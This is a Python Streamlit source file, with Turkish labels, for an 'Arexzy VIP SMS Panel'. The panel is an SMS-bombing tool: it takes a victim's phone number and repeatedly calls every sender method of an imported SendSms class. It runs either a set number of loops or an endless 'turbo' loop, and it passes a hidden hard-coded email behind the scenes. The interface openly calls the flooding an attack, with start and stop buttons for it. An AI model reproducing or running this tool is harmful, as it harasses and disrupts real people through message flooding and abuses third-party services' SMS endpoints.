import streamlit as st
import time
import re

# sms.py entegrasyonu
try:
    from sms import SendSms
except ImportError:
    st.error("HATA: sms.py dosyası bulunamadı!")

# 1. Sayfa Ayarları
st.set_page_config(page_title="Arexzy VIP SMS Panel", page_icon="⚡", layout="centered")

# Sayfa Başlıkları
st.markdown("""
    <style>
        .main-title { text-align: center; color: #00ffcc; font-family: monospace; font-size: 40px; font-weight: bold; text-shadow: 0px 0px 10px #00ffcc; }
        .sub-title { text-align: center; color: #ff0055; font-family: monospace; font-size: 16px; margin-bottom: 30px; }
    </style>
""", unsafe_allow_html=True)
st.markdown('<div class="main-title">⚡ AREXZY PANEL ⚡</div>', unsafe_allow_html=True)
st.markdown('<div class="sub-title">Web Tabanlı Gelişmiş SMS Gönderim Sistemi</div>', unsafe_allow_html=True)
st.write("---")

st.subheader("📋 Gönderim Bilgileri")

# Kullanıcı Girdileri (Mail kutusu kaldırıldı!)
numara_input = st.text_input("Hedef Telefon Numarasını Girin:", placeholder="Örn: 5051234567")

# Arka planda kullanılacak gizli mail adresi
gizli_mail = "arexzy_panel@gmail.com"

mod = st.selectbox(
    "Gönderim Modunu Seçin:",
    ["Seçim Yapınız...", "1- SMS Gönder (Normal Mod - Belirli Sayıda)", "2- SMS Gönder (Turbo Mod - Sonsuz/Durdurana Kadar)"]
)

# Turbo modda miktar çubuğunu gizleme mantığı
miktar = 0
if mod == "1- SMS Gönder (Normal Mod - Belirli Sayıda)":
    miktar = st.slider("Gönderilecek SMS Miktarı (Döngü Sayısı):", min_value=1, max_value=100, value=10)

st.write("---")

# Saldırı Durumu Kontrolü
if "saldiri_aktif" not in st.session_state:
    st.session_state.saldiri_aktif = False

# Tetikleyici Butonlar
if not st.session_state.saldiri_aktif:
    baslat_butonu = st.button("Saldırıyı Başlat 🚀", use_container_width=True)
    if baslat_butonu:
        if not numara_input:
            st.error("❌ Telefon numarası yazmalısınız!")
        elif mod == "Seçim Yapınız...":
            st.error("❌ Lütfen bir mod seçin!")
        else:
            # Numarayı temizle
            temiz_numara = re.sub(r"\D", "", numara_input)
            if temiz_numara.startswith("0"):
                temiz_numara = temiz_numara[1:]
            
            if len(temiz_numara) != 10:
                st.error("❌ Numara 10 haneli olmalıdır!")
            else:
                # Bilgileri kaydet ve başlat
                st.session_state.saldiri_aktif = True
                st.session_state.temiz_numara = temiz_numara
                st.session_state.secilen_mod = mod
                st.session_state.miktar = miktar
                st.rerun()

# Eğer saldırı aktifse çalışacak döngü paneli
if st.session_state.saldiri_aktif:
    st.warning("⚡ SALDIRI ŞU ANDA AKTİF VÇALIŞIYOR! ⚡")
    
    dur_butonu = st.button("🔴 SALDIRIYI DURDUR", use_container_width=True)
    if dur_butonu:
        st.session_state.saldiri_aktif = False
        st.success("Saldırı başarıyla durduruldu! ✅")
        st.rerun()

    no = st.session_state.temiz_numara
    aktif_mod = st.session_state.secilen_mod
    
    with st.spinner("Arka planda API'ler durmaksızın tetikleniyor..."):
        try:
            # Burası kritik: Mail giriş kutusu yok ama arkada gizli_mail değişkenini gönderiyoruz!
            islem = SendSms(no, gizli_mail)
            
            # sms.py içindeki fonksiyonları dinamik olarak çekme
            servisler_sms = []
            for attribute in dir(SendSms):
                attribute_value = getattr(SendSms, attribute)
                if callable(attribute_value) and not attribute.startswith('__'):
                    servisler_sms.append(attribute)

            # 🚀 MOD 1: NORMAL MOD
            if "Normal Mod" in aktif_mod:
                toplam_adet = st.session_state.miktar
                sayac_alani = st.empty()
                
                for i in range(toplam_adet):
                    for metot_adi in servisler_sms:
                        metot = getattr(islem, metot_adi)
                        metot()
                    
                    sayac_alani.text(f"📊 Normal Mod: Döngü [{i+1}/{toplam_adet}] tamamlandı.")
                    time.sleep(0.3)
                
                st.session_state.saldiri_aktif = False
                st.balloons()
                st.success("🎉 Hedeflenen miktarda SMS başarıyla gönderildi!")
                st.rerun()

            # 🚀 MOD 2: TURBO MOD
            elif "Turbo Mod" in aktif_mod:
                sayac = 0
                turbo_sayac_alani = st.empty()
                
                while st.session_state.saldiri_aktif:
                    sayac += 1
                    for metot_adi in servisler_sms:
                        try:
                            metot = getattr(islem, metot_adi)
                            metot()
                        except:
                            pass
                    
                    turbo_sayac_alani.text(f"🔥 TURBO MOD: {sayac}. sonsuz döngü turu dönüyor... Aralıksız istek gidiyor!")
                    time.sleep(0.1)
                    
        except Exception as e:
            st.error(f"⚠️ Kritik bir hata oluştu: {e}")
            st.session_state.saldiri_aktif = False

# Alt Bilgi
st.write("")
st.markdown("<p style='text-align: center; color: gray; font-size: 12px;'>Arexzy Software © 2026</p>", unsafe_allow_html=True)
